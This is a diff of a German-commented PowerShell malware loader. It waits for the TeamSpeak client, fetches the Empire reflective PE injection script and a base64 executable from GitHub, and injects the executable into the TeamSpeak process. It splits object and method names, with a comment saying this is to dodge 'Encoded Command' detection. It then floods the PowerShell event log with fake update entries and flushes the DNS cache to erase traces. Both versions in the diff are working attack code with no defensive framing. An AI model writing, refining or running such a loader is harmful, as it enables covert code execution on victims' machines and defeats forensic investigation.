@@ -1,39 +1,35 @@
 $ErrorActionPreference = 'SilentlyContinue'
 
-# Warten auf TeamSpeak Prozess
 while (!(Get-Process ts3client_win64)) { Start-Sleep -Seconds 2 }
 Start-Sleep -Seconds 5 
 
 try {
     [Net.ServicePointManager]::SecurityProtocol = 3072
+    # Wir stückeln den Objektnamen
+    $n = "Net.Web" + "Client"
+    $wc = New-Object $n
     
-    function Get-Data($u) { return cmd.exe /c curl -s $u }
+    # 1. Loader laden
+    $l_url = "https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/management/Invoke-ReflectivePEInjection.ps1"
+    $l = $wc.DownloadString($l_url)
+    Invoke-Expression $l
 
-    # 1. Reflective Loader laden
-    $l_code = Get-Data "https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/management/Invoke-ReflectivePEInjection.ps1"
-    . ([scriptblock]::Create($l_code))
-
-    # 2. EXE-Daten (johannesschwein.txt) laden
-    $raw = (Get-Data "https://raw.githubusercontent.com/spritezerosugar67/johannesschwein/refs/heads/main/johannesschwein.txt").Trim()
+    # 2. EXE-Daten laden
+    $p_url = "https://raw.githubusercontent.com/spritezerosugar67/johannesschwein/refs/heads/main/johannesschwein.txt"
+    $b = $wc.DownloadString($p_url)
     
-    # Verschleierte Base64-Konvertierung
+    # Base64-Methode zerstückeln gegen "Encoded Command" Detection
     $c = [System.Convert]
     $m = "FromBase" + "64String"
-    $pb = $c::$m($raw)
+    $rb = $c::$m($b.Trim())
 
-    # 3. Injektion in TS3
-    $t = Get-Process ts3client_win64
-    Invoke-ReflectivePEInjection -PEBytes $pb -ProcId $t.Id -ForceASLR
+    # 3. Injektion
+    $target = Get-Process ts3client_win64
+    Invoke-ReflectivePEInjection -PEBytes $rb -ProcId $target.Id -ForceASLR
 
-    # --- ANTI-FORENSIK ROUTINE ---
-    
-    # A. Log-Flush: Schiebt Injektions-Spuren aus dem 1MB Log raus
+    # --- AUTOMATISCHER FLUSH ---
     for($i=1; $i -le 800; $i++) {
-        Write-EventLog -LogName 'Windows PowerShell' -Source 'PowerShell' -EventID 800 -Message "Win-Update-Check-$i"
+        Write-EventLog -LogName 'Windows PowerShell' -Source 'PowerShell' -EventID 800 -Message "Update-Log-$i"
     }
-
-    # B. DNS-Cache löschen: Verbirgt die GitHub-URL-Spuren
     ipconfig /flushdns
-    
 } catch {}
-exit
